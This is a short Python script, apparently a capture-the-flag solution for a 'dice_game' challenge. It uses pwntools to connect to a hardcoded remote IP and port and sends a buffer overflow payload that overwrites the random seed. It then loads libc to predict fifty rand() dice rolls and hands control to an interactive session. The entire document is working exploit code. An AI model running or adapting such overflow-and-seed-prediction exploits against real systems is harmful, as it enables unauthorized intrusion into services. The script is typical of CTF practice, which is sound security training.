from pwn import *
from ctypes import *

context(arch="amd64", os="linux", log_level="debug")

# p = process("./dice_game")
p = remote("111.198.29.45", 37602)
payload = "a" * 0x40 + p64(1) + p64(1)
p.recvuntil("name:")
p.sendline(payload)

libc = cdll.LoadLibrary("./libc.so.6")

for i in range(50):
    num = str(libc.rand()%6 + 1)
    p.recvuntil("point(1~6): ")
    p.sendline(num)

p.interactive()